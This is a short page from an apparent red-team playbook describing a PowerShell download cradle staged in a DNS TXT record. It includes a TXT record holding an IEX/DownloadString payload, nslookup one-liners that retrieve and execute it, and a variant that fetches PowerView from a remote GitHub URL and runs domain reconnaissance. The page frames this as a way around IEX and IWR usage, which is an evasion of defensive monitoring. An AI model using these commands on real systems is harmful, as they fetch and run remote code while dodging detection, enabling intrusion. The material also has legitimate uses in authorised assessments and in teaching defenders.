# 5.2 Situational Awareness

## Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)

Instead of using `IEX` and `IWR` within assessments, try this:

* Host a text record with the payload at one of the unburned domains

| Name | Type | Value | TTL |
| --- | --- | --- | --- |
| cradle1 | TXT | "IEX(New-Object Net.WebClient).DownloadString($URI)" | 3600 |

```c
C:\> powershell . (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"""";'(nslookup -q=txt cradle1.domain.example)[-1]';Get-Domain'
```

### Previous

- [5 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md)
- [5.1 Persistence](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md)

### Next

- [6 Command-and-Control](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md)
